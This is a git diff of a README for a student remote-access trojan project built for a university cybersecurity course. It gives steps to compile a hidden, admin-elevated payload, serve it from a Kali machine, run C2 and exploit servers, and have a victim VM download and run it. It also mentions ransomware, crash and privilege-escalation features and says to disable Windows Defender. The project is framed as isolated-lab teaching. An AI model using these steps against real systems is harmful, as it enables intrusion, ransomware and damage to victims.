@@ -51,41 +51,73 @@ pip install pyinstaller pynput pywin32
 
 ## 🚀 Setup Instructions
 
-### Step 1: Windows Host - Compile Payload
+### Step 1: Windows Host - Compile Payload (CMD)
 ```cmd
-cd C:\Users\junai\NED_Project
+# Navigate to your project folder (adjust path as needed)
+cd C:\Users\YourUsername\NED_Project
 pip install pyinstaller
 pyinstaller --onefile --noconsole --uac-admin client.py
 cd dist
 ren client.exe payload.exe
 python -m http.server 8000
 ```
+**Keep this terminal open - HTTP server is running!**
 
-### Step 2: Kali VM - C2 Server (1 TERMINAL)
+---
+
+### Step 2: Kali VM - Create Project Folder & Download Payload
 ```bash
-mkdir NED_Project
-cd ~/NED_Project
+# Create project folder
+mkdir ~/K2_RAT
+cd ~/K2_RAT
+
+# Windows Host IP is usually 192.168.56.1
+# Download the compiled payload
+wget http://192.168.56.1:8000/payload.exe -O client.exe
+```
+
+---
+
+### Step 3: Kali VM - Terminal 1 (C2 Server)
+```bash
+cd ~/K2_RAT
 nano c2_server.py
---COPY AND PASTE THE C2 SERVER CODE ---
-Ctrl + O -> Enter -> Ctrl + X (TO SAVE)
+# COPY AND PASTE THE C2 SERVER CODE
+# Ctrl + O -> Enter -> Ctrl + X (to save)
+
+# Run C2 server
 python3 c2_server.py
 ```
 
-### Step 3: Kali VM - Exploit Server (2nd TERMINAL)
+---
+
+### Step 4: Kali VM - Terminal 2 (Exploit Server)
 ```bash
-cd ~/NED_Project
+cd ~/K2_RAT
 nano exploit_server.py
---COPY AND PASTE THE EXPLOIT SERVER CODE ---
-Ctrl + O -> Enter -> Ctrl + X (TO SAVE)
+# COPY AND PASTE THE EXPLOIT SERVER CODE
+# Ctrl + O -> Enter -> Ctrl + X (to save)
+
+# Run Exploit server
 python3 exploit_server.py
 ```
 
-### Step 4: Windows VM - Victim
+---
+
+### Step 5: Windows VM - Victim
 ```
-1. Open browser: http://192.168.56.102:8080/
-2. Download "k2_rat_educational.exe"
-3. Run the file (click "Yes" on UAC prompt)
-4. C2 server will show connection
+1. Find Kali's IP address:
+   ip a | grep 192.168   (in Kali terminal)
+
+2. Open browser in Windows VM:
+   http://<KALI_IP>:8080/   (e.g., http://192.168.56.102:8080/)
+
+3. Download "k2_rat_educational.exe"
+
+4. Run the file (click "Yes" on UAC prompt)
+
+5. C2 server will show connection: 
+   "✅ New target: WIN_19216856103 - 192.168.56.103"
 ```
 
 ---
@@ -121,22 +153,15 @@ python3 exploit_server.py
 | **Privilege Escalation** | T1068 | User addition via `net user` |
 | **Defense Evasion** | T1564.001 | Hidden files, process masquerading |
 
-<!-- ---
-
-## 📸 Screenshots
-*Add your screenshots here:*
-- C2 server with connected target
-- Ransomware encryption
-- BSOD / crash demonstration
-- Wireshark traffic capture
-
---- -->
+---
 
 ## ⚠️ Important Notes
 - **Windows Defender** must be disabled in victim VM
 - Use only in **isolated lab environment**
-- Educational purposes only
+- **Educational purposes only**
 - Take VM snapshot before testing kill commands
+- Windows Host IP is usually `192.168.56.1` (verify with `ipconfig`)
+- Kali IP will vary - use `ip a` to find yours
 
 ---
 
@@ -157,4 +182,10 @@ This project is for **educational purposes only**. Unauthorized use against real
 ## 🙏 Acknowledgements
 - PITP NED University Cybersecurity Course
 - Submitted to Miss Zainab Kamal
+
 ---
+
+## 🔗 GitHub Repository
+```
+https://github.com/junaid-sarwar/PITP-PROJECT-K2_RAT
+```
